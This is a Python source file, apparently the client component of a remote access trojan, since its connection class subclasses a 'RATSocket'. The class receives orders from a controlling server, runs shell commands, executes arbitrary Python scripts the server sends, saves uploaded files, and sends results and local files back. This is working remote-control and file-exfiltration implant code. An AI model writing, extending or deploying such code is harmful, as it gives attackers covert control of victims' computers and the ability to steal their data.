import ntpath
import os
import queue

from client.commands.common import CommonCommands
from client.commands.executor import CommandExecutor
from core.protocol.message_queue import MessageQueue, ReadySignalQueue
from core.protocol.ratsocket import RATSocket
from core.utils.files import get_input_stream, get_output_stream
from core.utils.logger import logger


class ServerConnection(RATSocket):
    """
    客户端与服务器的连接类
    负责接收命令、发送结果/文件、执行命令
    """

    def __init__(self):
        super().__init__()
        self.client_id = None

        self.command_executor = CommandExecutor(self)
        self.command_queue = ReadySignalQueue()
        self.common_commands = CommonCommands(self)





    def send_result(self, id: int, status: int, result: str, eof: int = 1):
        """
        向服务端发送结果
        """
        data = {
            'type': 'result',
            'id': id,
            'status': status,
            'text': result,
            'cwd': os.getcwd(),
            'eof': eof,
        }
        logger.debug(data)
        self.send(data)

    def send_file(self, id: int, filename: str):
        """
        向服务端发送文件
        """
        header = {
            'type': 'file',
            'id': id,
            'length': os.stat(filename).st_size,
            'filename': ntpath.basename(filename),
            'cwd': os.getcwd(),
        }
        io = get_output_stream(filename)
        self.send(header)
        if self.recv_signal():
            self.send_io(io)


    def _handle_command_message(self, command_id: int, data: dict):
        """
        处理普通命令消息
        """
        result = self.command_executor.execute_command(command_id, data.get('text'))
        if result:
            return command_id, *result
        return None

    def _handle_script_message(self, command_id: int, data: dict):
        """
        处理 Python 脚本消息
        """
        result = self.common_commands.pyexec(data['text'], kwargs=data.get('extra'))
        return command_id, *result

    def _handle_file_message(self, command_id: int, data: dict):
        """
        处理文件消息
        """
        result = self.save_file(data.get('filename'), data.get('length'))
        if result:
            return command_id, *result
        return None

    def _handle_ready_message(self, data: dict):
        """
        处理就绪信号
        """
        self.command_queue.put(data.get('status'))
        return None

    def _dispatch_message(self, command_id: int, command_type: str, data: dict):
        """
        根据消息类型分发处理
        """
        if command_type == 'command':
            return self._handle_command_message(command_id, data)

        if command_type == 'script':
            return self._handle_script_message(command_id, data)

        if command_type == 'file':
            return self._handle_file_message(command_id, data)

        if command_type == 'rdy':
            return self._handle_ready_message(data)

        return None

    def recv_command(self) -> (int, int, str):
        data = self.recv()
        logger.debug(data)

        command_id = data.get('id')
        command_type = data.get('type')

        try:
            return self._dispatch_message(command_id, command_type, data)
        except Exception as e:
            logger.error(e, exc_info=True)
            return command_id, 0, f'{e}\n'

    def save_file(self, filename, length):
        file = os.path.abspath(filename)
        try:
            io = get_input_stream(file)
        except Exception as e:
            self.send_signal(0)
            return 0, str(e)

        try:
            self.send_signal(1)
            self.recv_io(length, io)
            return 1, f'File uploaded to: {os.path.abspath(file)}'
        except Exception as e:
            logger.error(f'Error receiving file from server: {e}', exc_info=True)
            return 0, f'Error receiving file from server: {e}'
